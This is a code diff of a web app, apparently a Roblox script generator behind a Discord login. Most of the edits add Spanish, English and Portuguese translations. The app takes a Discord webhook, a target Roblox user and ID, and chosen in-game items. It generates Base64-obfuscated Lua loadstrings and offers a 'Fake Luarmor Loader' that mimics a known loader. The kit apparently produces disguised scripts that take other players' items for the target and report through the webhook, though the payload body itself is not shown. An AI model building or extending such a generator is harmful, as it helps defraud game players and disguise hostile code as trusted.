@@ -278,16 +278,16 @@ input:checked+.slider:before{transform:translateX(20px);background:#fff}
 <!-- PERFIL DE DISCORD FIJO EN LA ESQUINA -->
 <div class="user-pill" id="userPill">
   <img id="userAvatar" src="" alt="Avatar">
-  <span id="userName">Usuario</span>
+  <span id="userName" data-i18n="userFallback">Usuario</span>
   <button class="logout-btn" id="logoutBtn" type="button" data-i18n="logout">Salir</button>
 </div>
 <div class="user-menu" id="userMenu">
   <div class="user-menu-item" id="autoSaveOption">
-    <span>Guardado Automático</span>
+    <span data-i18n="autoSave">Guardado Automático</span>
     <span class="autosave-badge" id="autoSaveBadge">ON</span>
   </div>
   <div class="user-menu-item" id="scriptsHistoryOption">
-    <span>Scripts Generados</span>
+    <span data-i18n="scriptsHistory">Scripts Generados</span>
     <span style="color:#fca5a5;font-size:11px">›</span>
   </div>
 </div>
@@ -295,8 +295,8 @@ input:checked+.slider:before{transform:translateX(20px);background:#fff}
 <div class="history-modal-overlay" id="historyModal">
   <div class="history-modal">
     <div class="history-modal-header">
-      <h3>Scripts Generados</h3>
-      <button class="history-close" id="historyCloseBtn" type="button">Cerrar</button>
+      <h3 data-i18n="scriptsHistory">Scripts Generados</h3>
+      <button class="history-close" id="historyCloseBtn" type="button" data-i18n="close">Cerrar</button>
     </div>
     <div class="history-list" id="historyList"></div>
   </div>
@@ -354,18 +354,18 @@ input:checked+.slider:before{transform:translateX(20px);background:#fff}
     </div>
 
     <div class="field"><label class="lbl" data-i18n="webhook">📡 WEBHOOK</label>
-      <input class="inp" id="webhookUrl" placeholder="https://discord.com/api/webhooks/..."></div>
+      <input class="inp" id="webhookUrl" data-i18n-placeholder="webhookPh" placeholder="https://discord.com/api/webhooks/..."></div>
     
     <div class="field">
       <label class="lbl" data-i18n="targetUser">👤 TARGET USER (opcional)</label>
-      <input class="inp" id="targetUser" placeholder="Nombre de usuario (presiona Enter o sal del campo)">
+      <input class="inp" id="targetUser" data-i18n-placeholder="targetUserPh" placeholder="Nombre de usuario (presiona Enter o sal del campo)">
       <div class="lookup-status" id="lookupStatus"></div>
     </div>
 
     <div class="field">
       <label class="lbl" data-i18n="targetId">🎯 TARGET ID</label>
-      <input class="inp" id="targetId" placeholder="Ej: 123456789">
-      <div class="search-hint">💡 Escribe el usuario y sal del campo (o pulsa Enter) para buscar su ID, o copia los números del enlace en <a href="https://www.roblox.com" target="_blank">Roblox</a>.</div>
+      <input class="inp" id="targetId" data-i18n-placeholder="targetIdPh" placeholder="Ej: 123456789">
+      <div class="search-hint"><span data-i18n="searchHint">💡 Escribe el usuario y sal del campo (o pulsa Enter) para buscar su ID, o copia los números del enlace en</span> <a href="https://www.roblox.com" target="_blank">Roblox</a>.</div>
     </div>
 
     <div class="field"><label class="lbl" data-i18n="scriptMode">MODO DE SCRIPT</label>
@@ -377,14 +377,14 @@ input:checked+.slider:before{transform:translateX(20px);background:#fff}
         <button class="mode-btn" data-mode="CUSTOM" data-index="3">CUSTOM</button>
       </div>
       <div class="custom-area" id="customArea" style="display:none;">
-        <input class="inp" id="customLoader" placeholder="Example: https://tu-ui.com/ui.lua">
+        <input class="inp" id="customLoader" data-i18n-placeholder="customLoaderPh" placeholder="Example: https://tu-ui.com/ui.lua">
       </div>
     </div>
 
     <div class="field"><label class="lbl" data-i18n="brainrots">🎨 TARGET BRAINROTS</label>
       <div style="display:flex;gap:8px;margin-bottom:8px;align-items:center">
-        <input class="inp" id="mpsFilter" placeholder="Filtrar m/s (ej: 50m)" style="flex:1;padding:8px 12px;font-size:12px">
-        <button type="button" id="mpsFilterBtn" style="padding:8px 12px;background:#1f0b0b;border:1px solid #2a1515;border-radius:10px;color:#fff;cursor:pointer;font-size:12px;font-weight:700;white-space:nowrap">Aplicar</button>
+        <input class="inp" id="mpsFilter" data-i18n-placeholder="mpsFilterPh" placeholder="Filtrar m/s (ej: 50m)" style="flex:1;padding:8px 12px;font-size:12px">
+        <button type="button" id="mpsFilterBtn" data-i18n="apply" style="padding:8px 12px;background:#1f0b0b;border:1px solid #2a1515;border-radius:10px;color:#fff;cursor:pointer;font-size:12px;font-weight:700;white-space:nowrap">Aplicar</button>
       </div>
       <div class="position-relative">
         <button class="br-select-btn" id="brToggle" type="button"><span id="brCount" data-i18n="selectBrainrots">Selecciona brainrots...</span><span>▼</span></button>
@@ -442,12 +442,12 @@ input:checked+.slider:before{transform:translateX(20px);background:#fff}
       <div class="loadstring-title" data-i18n="options">&lt;/&gt; Opciones Loadstring</div>
       <div class="toggle-card">
         <div class="toggle-info"><div class="toggle-icon">📋</div>
-        <div class="toggle-text"><h4>Pastefy</h4><p data-i18n="pastefyDesc">Sube el script a Pastefy y genera un loadstring compacto.</p></div></div>
+        <div class="toggle-text"><h4 data-i18n="pastefy">Pastefy</h4><p data-i18n="pastefyDesc">Sube el script a Pastefy y genera un loadstring compacto.</p></div></div>
         <label class="switch"><input type="checkbox" id="togglePastefy"><span class="slider"></span></label>
       </div>
       <div class="toggle-card">
         <div class="toggle-info"><div class="toggle-icon">🛡️</div>
-        <div class="toggle-text"><h4>Fake Luarmor Loader</h4><p>Sube el script a Fake Luarmor y genera un loadstring estilo Luarmor.</p></div></div>
+        <div class="toggle-text"><h4 data-i18n="fakeLuarmor">Fake Luarmor Loader</h4><p data-i18n="fakeLuarmorDesc">Sube el script a Fake Luarmor y genera un loadstring estilo Luarmor.</p></div></div>
         <label class="switch"><input type="checkbox" id="toggleFakeLuarmor"><span class="slider"></span></label>
       </div>
       <div class="toggle-card">
@@ -477,12 +477,12 @@ input:checked+.slider:before{transform:translateX(20px);background:#fff}
             <span class="credit-name">Adierxd</span>
             <span class="credit-badge cb-owner">👑FOUNDER</span>
           </div>
-          <span class="credit-role">Fundador</span>
+          <span class="credit-role" data-i18n="creditFounder">Fundador</span>
         </div>
       </div>
       <div class="credit-right">
         <a href="https://discord.com/users/1452133043165986950" target="_blank" class="credit-discord">@adierxd23</a>
-        <a href="https://discord.gg/UA9xGPKAqE" target="_blank" class="credit-join"> Join Server</a>
+        <a href="https://discord.gg/UA9xGPKAqE" target="_blank" class="credit-join" data-i18n="joinServer"> Join Server</a>
       </div>
     </div>
 
@@ -494,12 +494,12 @@ input:checked+.slider:before{transform:translateX(20px);background:#fff}
             <span class="credit-name">Edwxn</span>
             <span class="credit-badge cb-owner">✨Co-Owner</span>
           </div>
-          <span class="credit-role">Co-Owner y Colaborador</span>
+          <span class="credit-role" data-i18n="creditCoOwner">Co-Owner y Colaborador</span>
         </div>
       </div>
       <div class="credit-right">
         <a href="https://discord.com/users/1422951543120068759" target="_blank" class="credit-discord">@edwxn0947</a>
-        <a href="https://discord.gg/UA9xGPKAqE" target="_blank" class="credit-join"> Join Server</a>
+        <a href="https://discord.gg/UA9xGPKAqE" target="_blank" class="credit-join" data-i18n="joinServer"> Join Server</a>
       </div>
     </div>
 
@@ -511,12 +511,12 @@ input:checked+.slider:before{transform:translateX(20px);background:#fff}
             <span class="credit-name">SpyderGoat</span>
             <span class="credit-badge cb-dev">👩‍💻 DEV</span>
           </div>
-          <span class="credit-role">Desarrollador</span>
+          <span class="credit-role" data-i18n="creditDev">Desarrollador</span>
         </div>
       </div>
       <div class="credit-right">
         <a href="https://discord.com/users/752250822368166011" target="_blank" class="credit-discord">@spydergoatdevsab</a>
-        <a href="https://discord.gg/d2EgKtBbM" target="_blank" class="credit-join"> Join Server</a>
+        <a href="https://discord.gg/d2EgKtBbM" target="_blank" class="credit-join" data-i18n="joinServer"> Join Server</a>
       </div>
     </div>
   </div>
@@ -535,20 +535,252 @@ const REQUIRED_GUILD_ID = "1545539307115389090";
 let userInRequiredServer = false;
 
 const I18N = {
-  es:{loginTitle:"WXNAD MOREIRA",loginDesc:"Inicia sesión con tu cuenta de Discord para acceder al generador de scripts.",loginBtn:"Continuar con Discord",logout:"Salir",subtitle:"Generación automática de scripts para tus targets de Roblox",discord:"Únete a nuestro Discord",badge1:"⚡ Generación instantánea",badge2:"🔒 Webhook seguro",badge3:"🎯 Selección precisa",webhook:"📡 WEBHOOK",targetUser:"👤 TARGET USER (opcional)",targetId:"🎯 TARGET ID",scriptMode:"MODO DE SCRIPT",brainrots:"🎨 TARGET BRAINROTS",selectBrainrots:"Selecciona brainrots...",gears:"⚙️ TARGET GEARS",selectGears:"Selecciona gears...",bases:"🏠 TARGET BASES",selectBases:"Selecciona bases...",all:"Todos",searchBrainrot:"Buscar brainrot...",searchGear:"Buscar gear...",searchBase:"Buscar base...",selectAll:"Seleccionar Todos",deselect:"Deseleccionar",close:"Cerrar",options:"</> Opciones Loadstring",pastefyDesc:"Sube el script a Pastefy y genera un loadstring compacto.",obfuscate:"Ofuscar script",obfuscateDesc:"Ofuscación local en Base64.",genWarn:"⚠️ SELECCIONA AL MENOS UN TARGET",genId:"⚠️ INGRESA UN TARGET ID",genServer:"⚠️ DEBES ESTAR EN EL SERVIDOR DE DISCORD",genOk:"✨ GENERAR SCRIPT",generated:"📜 Script generado",copy:"Copiar",selected:"seleccionados"},
-  en:{loginTitle:"WXNAD MOREIRA",loginDesc:"Sign in with your Discord account to access the script generator.",loginBtn:"Continue with Discord",logout:"Logout",subtitle:"Automated script generation for your Roblox targets",discord:"Join our Discord",badge1:"⚡ Instant generation",badge2:"🔒 Secure webhook",badge3:"🎯 Precise target selection",webhook:"📡 WEBHOOK",targetUser:"👤 TARGET USER (opcional)",targetId:"🎯 TARGET ID",scriptMode:"SCRIPT MODE",brainrots:"🎨 TARGET BRAINROTS",selectBrainrots:"Select brainrots...",gears:"⚙️ TARGET GEARS",selectGears:"Select gears...",bases:"🏠 TARGET BASES",selectBases:"Select bases...",all:"All",searchBrainrot:"Search brainrot...",searchGear:"Search gear...",searchBase:"Search base...",selectAll:"Select All",deselect:"Deselect",close:"Close",options:"</> Loadstring Options",pastefyDesc:"Upload script to Pastefy and get a compact loadstring.",obfuscate:"Obfuscate script",obfuscateDesc:"Local obfuscation in Base64.",genWarn:"⚠️ SELECT AT LEAST ONE TARGET",genId:"⚠️ ENTER A TARGET ID",genServer:"⚠️ YOU MUST BE IN THE DISCORD SERVER",genOk:"✨ GENERATE SCRIPT",generated:"📜 Generated script",copy:"Copy",selected:"selected"},
-  pt:{loginTitle:"WXNAD MOREIRA",loginDesc:"Entre com sua conta do Discord para acessar o gerador de scripts.",loginBtn:"Continuar com Discord",logout:"Sair",subtitle:"Geração automática de scripts para seus targets do Roblox",discord:"Entre no nosso Discord",badge1:"⚡ Geração instantânea",badge2:"🔒 Webhook seguro",badge3:"🎯 Seleção precisa",webhook:"📡 WEBHOOK",targetUser:"👤 TARGET USUÁRIO (opcional)",targetId:"🎯 TARGET ID",scriptMode:"MODO DO SCRIPT",brainrots:"🎨 TARGET BRAINROTS",selectBrainrots:"Selecione brainrots...",gears:"⚙️ TARGET GEARS",selectGears:"Selecione gears...",bases:"🏠 TARGET BASES",selectBases:"Selecione bases...",all:"Todos",searchBrainrot:"Buscar brainrot...",searchGear:"Buscar gear...",searchBase:"Buscar base...",selectAll:"Selecionar Todos",deselect:"Desmarcar",close:"Fechar",options:"</> Opções Regras",pastefyDesc:"Envie o script para o Pastefy e gere um loadstring compacto.",obfuscate:"Ofuscar script",obfuscateDesc:"Ofusção local em Base64.",genWarn:"⚠️ SELECIONE PELO MENOS UM TARGET",genId:"⚠️ INSIRA UM TARGET ID",genServer:"⚠️ VOCÊ DEVE ESTAR NO SERVIDOR DO DISCORD",genOk:"✨ GERAR SCRIPT",generated:"📜 Script gerado",copy:"Copiar",selected:"selecionados"}
+  es:{
+    loginTitle:"WXNAD MOREIRA",
+    loginDesc:"Inicia sesión con tu cuenta de Discord para acceder al generador de scripts.",
+    loginBtn:"Continuar con Discord",
+    logout:"Salir",
+    subtitle:"Generación automática de scripts para tus targets de Roblox",
+    discord:"Únete a nuestro Discord",
+    badge1:"⚡ Generación instantánea",
+    badge2:"🔒 Webhook seguro",
+    badge3:"🎯 Selección precisa",
+    webhook:"📡 WEBHOOK",
+    targetUser:"👤 TARGET USER (opcional)",
+    targetId:"🎯 TARGET ID",
+    targetUserPh:"Nombre de usuario (presiona Enter o sal del campo)",
+    targetIdPh:"Ej: 123456789",
+    searchHint:"💡 Escribe el usuario y sal del campo (o pulsa Enter) para buscar su ID, o copia los números del enlace en",
+    scriptMode:"MODO DE SCRIPT",
+    brainrots:"🎨 TARGET BRAINROTS",
+    selectBrainrots:"Selecciona brainrots...",
+    gears:"⚙️ TARGET GEARS",
+    selectGears:"Selecciona gears...",
+    bases:"🏠 TARGET BASES",
+    selectBases:"Selecciona bases...",
+    all:"Todos",
+    searchBrainrot:"Buscar brainrot...",
+    searchGear:"Buscar gear...",
+    searchBase:"Buscar base...",
+    selectAll:"Seleccionar Todos",
+    deselect:"Deseleccionar",
+    close:"Cerrar",
+    options:"</> Opciones Loadstring",
+    pastefy:"Pastefy",
+    pastefyDesc:"Sube el script a Pastefy y genera un loadstring compacto.",
+    fakeLuarmor:"Fake Luarmor Loader",
+    fakeLuarmorDesc:"Sube el script a Fake Luarmor y genera un loadstring estilo Luarmor.",
+    obfuscate:"Ofuscar script",
+    obfuscateDesc:"Ofuscación local en Base64.",
+    genWarn:"⚠️ SELECCIONA AL MENOS UN TARGET",
+    genId:"⚠️ INGRESA UN TARGET ID",
+    genServer:"⚠️ DEBES ESTAR EN EL SERVIDOR DE DISCORD",
+    genOk:"✨ GENERAR SCRIPT",
+    generated:"📜 Script generado",
+    copy:"Copiar",
+    selected:"seleccionados",
+    autoSave:"Guardado Automático",
+    scriptsHistory:"Scripts Generados",
+    historyEmpty:"No hay scripts generados todavía.",
+    use:"Usar",
+    del:"Borrar",
+    mpsFilterPh:"Filtrar m/s (ej: 50m)",
+    apply:"Aplicar",
+    creditFounder:"Fundador",
+    creditCoOwner:"Co-Owner y Colaborador",
+    creditDev:"Desarrollador",
+    joinServer:"Join Server",
+    userFallback:"Usuario",
+    lookupEnter:"Pulsa Enter o sal del campo para buscar el ID",
+    lookupSearching:"Buscando ID en Roblox...",
+    lookupSearchingShort:"Buscando...",
+    lookupIdDetected:"ID detectado",
+    lookupFound:"ID encontrado",
+    lookupNotFound:"No se encontró el ID",
+    lookupRate:"Límite temporal (429). Espera unos segundos e intenta de nuevo.",
+    toastAutoOn:"✅ Guardado Automático activado",
+    toastAutoOff:"⏸️ Guardado Automático desactivado",
+    toastCopied:"📋 Script copiado",
+    toastLoaded:"✅ Script cargado",
+    toastDeleted:"🗑️ Eliminado",
+    toastNeedId:"⚠️ Ingresa un Target ID válido",
+    toastMpsInvalid:"⚠️ Escribe un valor válido (ej: 50m, 1b, 500k)",
+    toastMpsApplied:"brainrots ≥ filtro",
+    toastPastefy:"✅ Pastefy",
+    toastFakeLuarmor:"✅ Fake Luarmor Loader",
+    toastObfErr:"❌ Error de ofuscar",
+    noTarget:"Sin target",
+    customLoaderPh:"Example: https://tu-ui.com/ui.lua",
+    webhookPh:"https://discord.com/api/webhooks/..."
+  },
+  en:{
+    loginTitle:"WXNAD MOREIRA",
+    loginDesc:"Sign in with your Discord account to access the script generator.",
+    loginBtn:"Continue with Discord",
+    logout:"Logout",
+    subtitle:"Automated script generation for your Roblox targets",
+    discord:"Join our Discord",
+    badge1:"⚡ Instant generation",
+    badge2:"🔒 Secure webhook",
+    badge3:"🎯 Precise target selection",
+    webhook:"📡 WEBHOOK",
+    targetUser:"👤 TARGET USER (optional)",
+    targetId:"🎯 TARGET ID",
+    targetUserPh:"Username (press Enter or leave the field)",
+    targetIdPh:"E.g: 123456789",
+    searchHint:"💡 Type the username and leave the field (or press Enter) to find its ID, or copy the numbers from the link on",
+    scriptMode:"SCRIPT MODE",
+    brainrots:"🎨 TARGET BRAINROTS",
+    selectBrainrots:"Select brainrots...",
+    gears:"⚙️ TARGET GEARS",
+    selectGears:"Select gears...",
+    bases:"🏠 TARGET BASES",
+    selectBases:"Select bases...",
+    all:"All",
+    searchBrainrot:"Search brainrot...",
+    searchGear:"Search gear...",
+    searchBase:"Search base...",
+    selectAll:"Select All",
+    deselect:"Deselect",
+    close:"Close",
+    options:"</> Loadstring Options",
+    pastefy:"Pastefy",
+    pastefyDesc:"Upload script to Pastefy and get a compact loadstring.",
+    fakeLuarmor:"Fake Luarmor Loader",
+    fakeLuarmorDesc:"Upload script to Fake Luarmor and get a Luarmor-style loadstring.",
+    obfuscate:"Obfuscate script",
+    obfuscateDesc:"Local Base64 obfuscation.",
+    genWarn:"⚠️ SELECT AT LEAST ONE TARGET",
+    genId:"⚠️ ENTER A TARGET ID",
+    genServer:"⚠️ YOU MUST BE IN THE DISCORD SERVER",
+    genOk:"✨ GENERATE SCRIPT",
+    generated:"📜 Generated script",
+    copy:"Copy",
+    selected:"selected",
+    autoSave:"Auto Save",
+    scriptsHistory:"Generated Scripts",
+    historyEmpty:"No generated scripts yet.",
+    use:"Use",
+    del:"Delete",
+    mpsFilterPh:"Filter m/s (e.g: 50m)",
+    apply:"Apply",
+    creditFounder:"Founder",
+    creditCoOwner:"Co-Owner and Collaborator",
+    creditDev:"Developer",
+    joinServer:"Join Server",
+    userFallback:"User",
+    lookupEnter:"Press Enter or leave the field to search the ID",
+    lookupSearching:"Searching Roblox ID...",
+    lookupSearchingShort:"Searching...",
+    lookupIdDetected:"ID detected",
+    lookupFound:"ID found",
+    lookupNotFound:"ID not found",
+    lookupRate:"Rate limit (429). Wait a few seconds and try again.",
+    toastAutoOn:"✅ Auto Save enabled",
+    toastAutoOff:"⏸️ Auto Save disabled",
+    toastCopied:"📋 Script copied",
+    toastLoaded:"✅ Script loaded",
+    toastDeleted:"🗑️ Deleted",
+    toastNeedId:"⚠️ Enter a valid Target ID",
+    toastMpsInvalid:"⚠️ Enter a valid value (e.g: 50m, 1b, 500k)",
+    toastMpsApplied:"brainrots ≥ filter",
+    toastPastefy:"✅ Pastefy",
+    toastFakeLuarmor:"✅ Fake Luarmor Loader",
+    toastObfErr:"❌ Obfuscate error",
+    noTarget:"No target",
+    customLoaderPh:"Example: https://your-ui.com/ui.lua",
+    webhookPh:"https://discord.com/api/webhooks/..."
+  },
+  pt:{
+    loginTitle:"WXNAD MOREIRA",
+    loginDesc:"Entre com sua conta do Discord para acessar o gerador de scripts.",
+    loginBtn:"Continuar com Discord",
+    logout:"Sair",
+    subtitle:"Geração automática de scripts para seus targets do Roblox",
+    discord:"Entre no nosso Discord",
+    badge1:"⚡ Geração instantânea",
+    badge2:"🔒 Webhook seguro",
+    badge3:"🎯 Seleção precisa",
+    webhook:"📡 WEBHOOK",
+    targetUser:"👤 TARGET USUÁRIO (opcional)",
+    targetId:"🎯 TARGET ID",
+    targetUserPh:"Nome de usuário (pressione Enter ou saia do campo)",
+    targetIdPh:"Ex: 123456789",
+    searchHint:"💡 Digite o usuário e saia do campo (ou pressione Enter) para buscar o ID, ou copie os números do link no",
+    scriptMode:"MODO DO SCRIPT",
+    brainrots:"🎨 TARGET BRAINROTS",
+    selectBrainrots:"Selecione brainrots...",
+    gears:"⚙️ TARGET GEARS",
+    selectGears:"Selecione gears...",
+    bases:"🏠 TARGET BASES",
+    selectBases:"Selecione bases...",
+    all:"Todos",
+    searchBrainrot:"Buscar brainrot...",
+    searchGear:"Buscar gear...",
+    searchBase:"Buscar base...",
+    selectAll:"Selecionar Todos",
+    deselect:"Desmarcar",
+    close:"Fechar",
+    options:"</> Opções Loadstring",
+    pastefy:"Pastefy",
+    pastefyDesc:"Envie o script para o Pastefy e gere um loadstring compacto.",
+    fakeLuarmor:"Fake Luarmor Loader",
+    fakeLuarmorDesc:"Envie o script para o Fake Luarmor e gere um loadstring estilo Luarmor.",
+    obfuscate:"Ofuscar script",
+    obfuscateDesc:"Ofuscação local em Base64.",
+    genWarn:"⚠️ SELECIONE PELO MENOS UM TARGET",
+    genId:"⚠️ INSIRA UM TARGET ID",
+    genServer:"⚠️ VOCÊ DEVE ESTAR NO SERVIDOR DO DISCORD",
+    genOk:"✨ GERAR SCRIPT",
+    generated:"📜 Script gerado",
+    copy:"Copiar",
+    selected:"selecionados",
+    autoSave:"Salvamento Automático",
+    scriptsHistory:"Scripts Gerados",
+    historyEmpty:"Ainda não há scripts gerados.",
+    use:"Usar",
+    del:"Apagar",
+    mpsFilterPh:"Filtrar m/s (ex: 50m)",
+    apply:"Aplicar",
+    creditFounder:"Fundador",
+    creditCoOwner:"Co-Owner e Colaborador",
+    creditDev:"Desenvolvedor",
+    joinServer:"Entrar no servidor",
+    userFallback:"Usuário",
+    lookupEnter:"Pressione Enter ou saia do campo para buscar o ID",
+    lookupSearching:"Buscando ID no Roblox...",
+    lookupSearchingShort:"Buscando...",
+    lookupIdDetected:"ID detectado",
+    lookupFound:"ID encontrado",
+    lookupNotFound:"ID não encontrado",
+    lookupRate:"Limite temporário (429). Espere alguns segundos e tente de novo.",
+    toastAutoOn:"✅ Salvamento Automático ativado",
+    toastAutoOff:"⏸️ Salvamento Automático desativado",
+    toastCopied:"📋 Script copiado",
+    toastLoaded:"✅ Script carregado",
+    toastDeleted:"🗑️ Removido",
+    toastNeedId:"⚠️ Insira um Target ID válido",
+    toastMpsInvalid:"⚠️ Digite um valor válido (ex: 50m, 1b, 500k)",
+    toastMpsApplied:"brainrots ≥ filtro",
+    toastPastefy:"✅ Pastefy",
+    toastFakeLuarmor:"✅ Fake Luarmor Loader",
+    toastObfErr:"❌ Erro ao ofuscar",
+    noTarget:"Sem target",
+    customLoaderPh:"Exemplo: https://sua-ui.com/ui.lua",
+    webhookPh:"https://discord.com/api/webhooks/..."
+  }
 };
 const FLAGS={es:"https://flagcdn.com/w80/es.png",en:"https://flagcdn.com/w80/us.png",pt:"https://flagcdn.com/w80/br.png"};
 let currentLang=localStorage.getItem("wxnad_lang")||"es";
 function t(k){return(I18N[currentLang]&&I18N[currentLang][k])||I18N.en[k]||k}
 function applyLang(){
   document.documentElement.lang=currentLang;
-  document.querySelectorAll("[data-i18n]").forEach(el=>{const k=el.getAttribute("data-i18n");if(I18N[currentLang][k])el.textContent=I18N[currentLang][k];});
-  document.querySelectorAll("[data-i18n-placeholder]").forEach(el=>{const k=el.getAttribute("data-i18n-placeholder");if(I18N[currentLang][k])el.placeholder=I18N[currentLang][k];});
+  document.querySelectorAll("[data-i18n]").forEach(el=>{const k=el.getAttribute("data-i18n");if(I18N[currentLang]&&I18N[currentLang][k])el.textContent=I18N[currentLang][k];});
+  document.querySelectorAll("[data-i18n-placeholder]").forEach(el=>{const k=el.getAttribute("data-i18n-placeholder");if(I18N[currentLang]&&I18N[currentLang][k])el.placeholder=I18N[currentLang][k];});
   document.getElementById("langBtnFlag").src=FLAGS[currentLang];
   document.querySelectorAll(".lang-item").forEach(item=>{const on=item.dataset.lang===currentLang;item.classList.toggle("active",on);item.querySelector(".check").textContent=on?"✓":"";});
   renderTags("brainrot");renderTags("gears");renderTags("bases");updateButtonState();
+  if(document.getElementById("historyModal")?.classList.contains("open")) renderScriptHistory();
 }
 document.getElementById("langBtn").onclick=e=>{e.stopPropagation();document.getElementById("langMenu").classList.toggle("open");};
 document.querySelectorAll(".lang-item").forEach(item=>{item.onclick=()=>{currentLang=item.dataset.lang;localStorage.setItem("wxnad_lang",currentLang);document.getElementById("langMenu").classList.remove("open");applyLang();};});
@@ -682,9 +914,9 @@ document.getElementById("autoSaveOption").onclick = e => {
     localStorage.setItem(getAutoSavePrefKey(currentDiscordUserId), String(autoSaveEnabled));
     if (autoSaveEnabled) {
       saveLoggedUserState();
-      showToast("✅ Guardado Automático activado");
+      showToast(t("toastAutoOn"));
     } else {
-      showToast("⏸️ Guardado Automático desactivado");
+      showToast(t("toastAutoOff"));
     }
   }
   updateAutoSaveBadge();
@@ -730,19 +962,19 @@ function renderScriptHistory(){
   if(!listEl) return;
   const list = loadScriptHistory();
   if(!list.length){
-    listEl.innerHTML = `<div class="history-empty">No hay scripts generados todavía.</div>`;
+    listEl.innerHTML = `<div class="history-empty">${t("historyEmpty")}</div>`;
     return;
   }
   listEl.innerHTML = list.map(item => {
-    const meta = [item.targetUser || item.targetId || "Sin target", item.mode || ""].filter(Boolean).join(" · ");
+    const meta = [item.targetUser || item.targetId || t("noTarget"), item.mode || ""].filter(Boolean).join(" · ");
     const preview = (item.script || "").slice(0,90).replace(/</g,"&lt;").replace(/>/g,"&gt;");
     return `<div class="history-item" data-id="${item.id}">
       <div class="history-item-top">
         <span class="history-date">${formatHistoryDate(item.date)}</span>
         <div class="history-actions">
-          <button type="button" data-act="copy">Copiar</button>
-          <button type="button" data-act="use">Usar</button>
-          <button type="button" data-act="del">Borrar</button>
+          <button type="button" data-act="copy">${t("copy")}</button>
+          <button type="button" data-act="use">${t("use")}</button>
+          <button type="button" data-act="del">${t("del")}</button>
         </div>
       </div>
       <div class="history-meta">${meta}</div>
@@ -779,16 +1011,16 @@ document.getElementById("historyList").onclick = e => {
   const act = btn.dataset.act;
   if(act === "copy"){
     navigator.clipboard.writeText(item.script||"");
-    showToast("📋 Script copiado");
+    showToast(t("toastCopied"));
   } else if(act === "use"){
     document.getElementById("scriptOutput").textContent = item.script || "";
     document.getElementById("result").classList.add("show");
     closeScriptHistory();
-    showToast("✅ Script cargado");
+    showToast(t("toastLoaded"));
   } else if(act === "del"){
     saveScriptHistory(list.filter(x => x.id !== id));
     renderScriptHistory();
-    showToast("🗑️ Eliminado");
+    showToast(t("toastDeleted"));
   }
 };
 
@@ -1659,7 +1891,6 @@ function parseFilterMin(raw) {
   const n = parseFloat(m[1]);
   if (isNaN(n)) return null;
   const unit = (m[2] || "").toUpperCase();
-  // Sin unidad = millones (50 → 50M)
   const mult = unit === "T" ? 1e12 : unit === "B" ? 1e9 : unit === "M" ? 1e6 : unit === "K" ? 1e3 : 1e6;
   return n * mult;
 }
@@ -1668,7 +1899,7 @@ function applyMpsFilter() {
   const raw = (document.getElementById("mpsFilter") || {}).value || "";
   const minVal = parseFilterMin(raw);
   if (minVal === null) {
-    showToast("⚠️ Escribe un valor válido (ej: 50m, 1b, 500k)");
+    showToast(t("toastMpsInvalid"));
     return;
   }
   let count = 0;
@@ -1683,7 +1914,7 @@ function applyMpsFilter() {
   renderTags("brainrot");
   updateButtonState();
   saveLoggedUserState();
-  showToast("✅ " + count + " brainrots ≥ filtro");
+  showToast("✅ " + count + " " + t("toastMpsApplied"));
 }
 
 
@@ -1778,7 +2009,7 @@ async function autoLookupTargetUser(force = false) {
     idInput.value = urlId;
     lastAutoFilledId = urlId;
     updateButtonState();
-    setLookupStatus(`ID detectado: ${urlId}`, "ok");
+    setLookupStatus(`${t("lookupIdDetected")}: ${urlId}`, "ok");
     saveLoggedUserState();
     return;
   }
@@ -1788,13 +2019,13 @@ async function autoLookupTargetUser(force = false) {
     idInput.value = raw;
     lastAutoFilledId = raw;
     updateButtonState();
-    setLookupStatus(`ID detectado: ${raw}`, "ok");
+    setLookupStatus(`${t("lookupIdDetected")}: ${raw}`, "ok");
     saveLoggedUserState();
     return;
   }
 
   if (!force) {
-    setLookupStatus("Pulsa Enter o sal del campo para buscar el ID", "");
+    setLookupStatus(t("lookupEnter"), "");
     return;
   }
 
@@ -1804,7 +2035,7 @@ async function autoLookupTargetUser(force = false) {
   }
 
   const reqId = ++lookupRequestSeq;
-  setLookupStatus("Buscando ID en Roblox...", "loading");
+  setLookupStatus(t("lookupSearching"), "loading");
 
   const result = await fetchRobloxUserId(raw);
   if (reqId !== lookupRequestSeq) return;
@@ -1812,7 +2043,7 @@ async function autoLookupTargetUser(force = false) {
   lastQueriedUsername = normalized;
 
   if (result && result.rateLimited) {
-    setLookupStatus("Límite temporal (429). Espera unos segundos e intenta de nuevo.", "err");
+    setLookupStatus(t("lookupRate"), "err");
     return;
   }
 
@@ -1823,7 +2054,7 @@ async function autoLookupTargetUser(force = false) {
       lastAutoFilledId = result.id;
       updateButtonState();
     }
-    setLookupStatus(`ID encontrado (${result.name}): ${result.id}`, "ok");
+    setLookupStatus(`${t("lookupFound")} (${result.name}): ${result.id}`, "ok");
     saveLoggedUserState();
   } else {
     if (idInput.value.trim() === lastAutoFilledId) {
@@ -1831,7 +2062,7 @@ async function autoLookupTargetUser(force = false) {
       lastAutoFilledId = "";
       updateButtonState();
     }
-    setLookupStatus("No se encontró el ID", "err");
+    setLookupStatus(t("lookupNotFound"), "err");
   }
 }
 
@@ -1848,7 +2079,7 @@ document.getElementById("targetUser").addEventListener("input", () => {
     autoLookupTargetUser(true);
     return;
   }
-  setLookupStatus("Buscando...", "loading");
+  setLookupStatus(t("lookupSearchingShort"), "loading");
   lookupTimer = setTimeout(() => autoLookupTargetUser(true), 800);
 });
 
@@ -2085,7 +2316,7 @@ async function generateScript(){
     targetId = document.getElementById("targetId").value.trim();
   }
 
-  if(!targetId)return showToast("⚠️ Ingresa un Target ID válido");
+  if(!targetId)return showToast(t("toastNeedId"));
   if(!(selectedBrainrots.size||selectedGears.size||selectedBases.size))return showToast(t("genWarn"));
 
   const br = formatLuaTable(selectedBrainrots);
@@ -2119,7 +2350,7 @@ ${gr}}
     try {
       script = obfuscateBase64(script);
     } catch(e) {
-      showToast("❌ Error de ofuscar: " + e.message);
+      showToast(t("toastObfErr") + ": " + e.message);
       document.getElementById("scriptOutput").textContent = script;
       document.getElementById("result").classList.add("show");
       saveLoggedUserState();
@@ -2127,13 +2358,13 @@ ${gr}}
     }
   }
 
-  if(usePastefy){try{script=await uploadToPastefy(script);showToast("✅ Pastefy");}catch(e){showToast("❌ Pastefy: "+e.message);document.getElementById("scriptOutput").textContent=script;document.getElementById("result").classList.add("show");saveLoggedUserState();return;}}
